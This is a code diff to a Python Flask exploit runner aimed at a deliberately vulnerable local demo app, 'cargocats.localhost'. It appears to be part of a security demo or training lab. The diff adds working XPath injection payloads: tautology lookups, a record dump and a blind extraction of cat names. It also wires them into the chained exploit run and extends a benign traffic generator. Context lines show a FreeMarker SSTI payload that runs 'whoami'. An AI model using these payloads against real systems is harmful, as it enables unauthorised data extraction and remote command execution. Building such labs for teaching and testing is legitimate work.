@@ -634,13 +634,13 @@ def exploit_deserialization():
 @app.route('/exploit/ssti')
 def exploit_ssti():
     global exploit_running, exploit_state, exploit_output_buffer, stop_exploit_flag
-    
+
     if exploit_running:
         return jsonify({"status": "error", "message": "Exploit already running"}), 400
-    
+
     exploit_running = True
     exploit_state = "ssti_exploit"
-    
+
     try:
         session = requests.Session()
         # Login first
@@ -648,7 +648,7 @@ def exploit_ssti():
         if not login_result:
             log_exploit_output("Login failed - cannot proceed with SSTI exploit", "ERROR")
             return jsonify({"status": "error", "message": "Login failed - cannot proceed with SSTI exploit"}), 500
-        
+
         result = run_ssti_exploit(session)
         exploit_state = "finished"
         log_exploit_output(f"SSTI exploit completed - Success: {result}")
@@ -659,6 +659,35 @@ def exploit_ssti():
         return jsonify({"status": "error", "message": f"SSTI exploit failed: {str(e)}"}), 500
     finally:
         exploit_running = False
+
+@app.route('/exploit/xpath-injection')
+def exploit_xpath_injection():
+    global exploit_running, exploit_state, exploit_output_buffer, stop_exploit_flag
+
+    if exploit_running:
+        return jsonify({"status": "error", "message": "Exploit already running"}), 400
+
+    exploit_running = True
+    exploit_state = "xpath_injection"
+
+    try:
+        session = requests.Session()
+        login_result = run_login_exploit(session)
+        if not login_result:
+            log_exploit_output("Login failed - cannot proceed with XPath injection exploit", "ERROR")
+            return jsonify({"status": "error", "message": "Login failed - cannot proceed with XPath injection exploit"}), 500
+
+        result = run_xpath_injection_exploit(session)
+        exploit_state = "finished"
+        log_exploit_output(f"XPath injection exploit completed - Success: {result}")
+        return jsonify({"status": "success", "message": "XPath injection exploit completed", "result": result}), 200
+    except Exception as e:
+        exploit_state = "error"
+        log_exploit_output(f"XPath injection exploit failed: {str(e)}", "ERROR")
+        return jsonify({"status": "error", "message": f"XPath injection exploit failed: {str(e)}"}), 500
+    finally:
+        exploit_running = False
+
 
 @app.route('/exploit/list')
 def exploit_list():
@@ -673,7 +702,8 @@ def exploit_list():
         {"name": "SSJS Injection", "endpoint": "/exploit/ssjs-injection", "description": "Server-side JavaScript injection"},
         {"name": "XXE", "endpoint": "/exploit/xxe", "description": "XML External Entity injection"},
         {"name": "Insecure Deserialization", "endpoint": "/exploit/deserialization", "description": "Java Insecure Deserialization exploit using address import functionality"},
-        {"name": "SSTI", "endpoint": "/exploit/ssti", "description": "FreeMarker Server-Side Template Injection (CVE-2025-64087)"}
+        {"name": "SSTI", "endpoint": "/exploit/ssti", "description": "FreeMarker Server-Side Template Injection (CVE-2025-64087)"},
+        {"name": "XPath Injection", "endpoint": "/exploit/xpath-injection", "description": "XPath injection exploit via tracking report service (ID lookup, search tautology, blind exfil)"}
     ]
     
     return jsonify({
@@ -1510,7 +1540,7 @@ def run_deserialization_exploit(session):
 def run_ssti_exploit(session):
     """Execute FreeMarker SSTI exploit via report template generation (CVE-2025-64087)"""
     log_exploit_output("Executing FreeMarker SSTI exploit via report template generation")
-    
+
     try:
         # Send malicious FreeMarker template that uses ?new to instantiate Execute class
         ssti_payload = '${"freemarker.template.utility.Execute"?new()("whoami")}'
@@ -1524,7 +1554,7 @@ def run_ssti_exploit(session):
         r = session.post("http://cargocats.localhost/api/reports/generate", json=report_data, timeout=10, allow_redirects=False)
         log_exploit_output(f"SSTI exploit response status: {r.status_code}")
         log_exploit_output(f"SSTI exploit response body: {r.text[:500] if r.text else 'Empty'}")
-        
+
         if r.status_code == 200:
             try:
                 response_data = r.json()
@@ -1543,11 +1573,75 @@ def run_ssti_exploit(session):
             # A 500 with an error about Execute class still indicates the SSTI was processed
             log_exploit_output("SSTI payload was processed by the template engine (server error may indicate partial success)")
             return True
-        
+
         return False
     except Exception as e:
         log_exploit_output(f"Error during SSTI exploit: {str(e)}", "ERROR")
         return False
+
+def run_xpath_injection_exploit(session):
+    """Execute XPath injection exploits via tracking report service"""
+    log_exploit_output("Executing XPath injection exploits via tracking report service")
+
+    # -------------------------------------------------------
+    # 1. ID-based XPath injection (tracking_id query parameter)
+    #    Injected query: //shipment[@trackingId='TRACK-A1B2C3D4' or '1'='1']
+    #    Returns first shipment regardless of tracking ID.
+    # -------------------------------------------------------
+    id_payload = "TRACK-A1B2C3D4' or '1'='1"
+    r = session.get(f"http://cargocats.localhost/api/tracking-report?tracking_id={requests.utils.quote(id_payload)}", timeout=15)
+    log_exploit_output(f"XPath injection (ID lookup) response status: {r.status_code}")
+    if r.status_code == 200:
+        try:
+            data = r.json()
+            log_exploit_output(f"XPath injection ID result: tracking_id={data.get('tracking_id')}, events={data.get('event_count')}")
+            if data.get('tracking_id'):
+                log_exploit_output("SUCCESS: XPath injection returned a tracking report via tautology injection")
+        except Exception:
+            pass
+
+    # -------------------------------------------------------
+    # 2. Search endpoint XPath injection (q query parameter)
+    #    Closes contains() early then adds a tautology to dump all records.
+    #    Injected: x') or '1'='1' or contains(cat,'
+    #    Resulting predicate: contains(...,'x') or '1'='1' or contains(cat,'...')
+    # -------------------------------------------------------
+    search_payload = "x') or '1'='1' or contains(cat,'"
+    r = session.get(f"http://cargocats.localhost/api/tracking-report/search?q={requests.utils.quote(search_payload)}", timeout=15)
+    log_exploit_output(f"XPath injection (search) response status: {r.status_code}")
+    if r.status_code == 200:
+        try:
+            data = r.json()
+            count = data.get('count', 0)
+            log_exploit_output(f"XPath injection search returned {count} result(s)")
+            if count > 1:
+                log_exploit_output("SUCCESS: XPath injection dumped all shipment records via tautology injection")
+        except Exception:
+            pass
+
+    # -------------------------------------------------------
+    # 3. Blind XPath — exfiltrate cat names containing 'iskers'
+    #    Closes contains() early then filters on a known cat name substring.
+    #    Injected: x') or contains(cat,'iskers') or contains(cat,'
+    #    Returns only the 'Whiskers' record if it exists — confirms data exfil.
+    # -------------------------------------------------------
+    blind_payload = "x') or contains(cat,'iskers') or contains(cat,'"
+    r = session.get(f"http://cargocats.localhost/api/tracking-report/search?q={requests.utils.quote(blind_payload)}", timeout=15)
+    log_exploit_output(f"XPath injection (blind/exfiltration) response status: {r.status_code}")
+    if r.status_code == 200:
+        try:
+            data = r.json()
+            results = data.get('results', [])
+            if results:
+                cats = [s.get('cat', '') for s in results]
+                log_exploit_output(f"SUCCESS: Blind XPath exfiltrated cat name(s): {cats}")
+            else:
+                log_exploit_output("Blind XPath returned no results (cat name not in XML yet)")
+        except Exception:
+            pass
+
+    return r.status_code in [200, 500]
+
 
 ########################################
 # exploits
@@ -1666,6 +1760,14 @@ def exploit():
         if check_exploit_stop("SSTI"):
             return
         run_ssti_exploit(session)
+
+        # ================================================
+        # XPATH INJECTION EXPLOIT
+        # ================================================
+        exploit_state = "xpath_injection"
+        if check_exploit_stop("XPath injection"):
+            return
+        run_xpath_injection_exploit(session)
 
         exploit_state = "finished"
         log_exploit_output("Exploit execution completed successfully")
@@ -1971,21 +2073,56 @@ def traffic():
         # ================================================
         traffic_state = "shipments_navigation"
         log_traffic_output("Phase 8: Shipments section navigation")
-        
+
         # Visit shipments page
         r = session.get("http://cargocats.localhost/shipments", timeout=5, allow_redirects=False)
         log_traffic_output(f"Visited shipments page - Status: {r.status_code}")
-        
+
         # Shipments API calls
         r = session.get("http://cargocats.localhost/api/addresses", timeout=5, allow_redirects=False)
         log_traffic_output(f"Shipments API /api/addresses - Status: {r.status_code}")
-        
+        addr_link = None
+        try:
+            addrs = r.json().get('_embedded', {}).get('address', [])
+            if addrs:
+                addr_link = addrs[0].get('_links', {}).get('self', {}).get('href', '')
+        except Exception:
+            pass
+
         r = session.get("http://cargocats.localhost/api/cats", timeout=5, allow_redirects=False)
         log_traffic_output(f"Shipments API /api/cats - Status: {r.status_code}")
-        
+        cat_link = None
+        try:
+            cats = r.json().get('_embedded', {}).get('cats', [])
+            if cats:
+                cat_link = cats[0].get('_links', {}).get('self', {}).get('href', '')
+        except Exception:
+            pass
+
         r = session.get("http://cargocats.localhost/api/shipments", timeout=5, allow_redirects=False)
         log_traffic_output(f"Shipments API /api/shipments - Status: {r.status_code}")
-        
+
+        # Capture an existing tracking ID, or create a fresh shipment to get one
+        shipment_tracking_id = None
+        try:
+            existing = r.json().get('_embedded', {}).get('shipments', [])
+            if existing:
+                shipment_tracking_id = existing[0].get('trackingId')
+                log_traffic_output(f"Using existing tracking ID: {shipment_tracking_id}")
+        except Exception:
+            pass
+
+        if not shipment_tracking_id and cat_link and addr_link:
+            try:
+                new_shipment = {"cat": cat_link, "fromAddress": addr_link, "toAddress": addr_link}
+                r_ship = session.post("http://cargocats.localhost/api/shipments", json=new_shipment, timeout=5, allow_redirects=False)
+                log_traffic_output(f"Created new shipment - Status: {r_ship.status_code}")
+                if r_ship.status_code in [200, 201]:
+                    shipment_tracking_id = r_ship.json().get('trackingId')
+                    log_traffic_output(f"New shipment tracking ID: {shipment_tracking_id}")
+            except Exception as e:
+                log_traffic_output(f"Error creating shipment: {str(e)}", "WARNING")
+
         # Process payment for shipment
         payment_data = {"shipmentId": "1", "cardNumber": "1111111111111111"}
         r = session.post("http://cargocats.localhost/api/payments/process", json=payment_data, timeout=5, allow_redirects=False)
@@ -2012,15 +2149,15 @@ def traffic():
         # ================================================
         traffic_state = "report_generation"
         log_traffic_output("Phase 9: Report generation")
-        
+
         # Visit reports page
         r = session.get("http://cargocats.localhost/reports", timeout=5, allow_redirects=False)
         log_traffic_output(f"Visited reports page - Status: {r.status_code}")
-        
+
         # Check report service health
         r = session.get("http://cargocats.localhost/api/reports/health", timeout=5, allow_redirects=False)
         log_traffic_output(f"Report service health check - Status: {r.status_code}")
-        
+
         # Generate a normal shipping report
         report_data = {
             "template": "Cargo Cats Shipping Report\n\nShipment ID: ${shipmentId}\nRecipient: ${recipientName}\nFrom: ${origin}\nTo: ${destination}\nDate: ${date}\nCarrier: ${company}\n\nStatus: In Transit",
@@ -2031,7 +2168,7 @@ def traffic():
         }
         r = session.post("http://cargocats.localhost/api/reports/generate", json=report_data, timeout=10, allow_redirects=False)
         log_traffic_output(f"Report generation POST - Status: {r.status_code}")
-        
+
         # Generate a second report with different data
         report_data_2 = {
             "template": "Delivery Confirmation\n\nPackage ${shipmentId} for ${recipientName} has been delivered from ${origin} to ${destination}.",
@@ -2042,6 +2179,48 @@ def traffic():
         }
         r = session.post("http://cargocats.localhost/api/reports/generate", json=report_data_2, timeout=10, allow_redirects=False)
         log_traffic_output(f"Second report generation POST - Status: {r.status_code}")
+
+        # ================================================
+        # PHASE 10: TRACKING REPORT SERVICE
+        # ================================================
+        traffic_state = "tracking_report"
+        log_traffic_output("Phase 10: Tracking report service")
+
+        if shipment_tracking_id:
+            # Normal lookup by tracking ID
+            r = session.get(
+                f"http://cargocats.localhost/api/tracking-report?tracking_id={requests.utils.quote(shipment_tracking_id)}",
+                timeout=10, allow_redirects=False
+            )
+            log_traffic_output(f"Tracking report GET by ID - Status: {r.status_code}")
+
+            # Add a tracking event for that shipment
+            event_data = {
+                "tracking_id": shipment_tracking_id,
+                "location": "Distribution Center",
+                "type": "transit",
+                "description": "Package scanned at distribution center"
+            }
+            r = session.post(
+                "http://cargocats.localhost/api/tracking-report/events",
+                json=event_data, timeout=10, allow_redirects=False
+            )
+            log_traffic_output(f"Tracking report POST event - Status: {r.status_code}")
+
+            # Search by partial tracking ID prefix
+            prefix = shipment_tracking_id[:8] if len(shipment_tracking_id) >= 8 else shipment_tracking_id
+            r = session.get(
+                f"http://cargocats.localhost/api/tracking-report/search?q={prefix}",
+                timeout=10, allow_redirects=False
+            )
+            log_traffic_output(f"Tracking report search by prefix - Status: {r.status_code}")
+        else:
+            # Fallback: search without a specific tracking ID
+            r = session.get(
+                "http://cargocats.localhost/api/tracking-report/search?q=TRACK",
+                timeout=10, allow_redirects=False
+            )
+            log_traffic_output(f"Tracking report search fallback - Status: {r.status_code}")
 
         traffic_state = "finished"
         log_traffic_output("Traffic generation completed successfully")
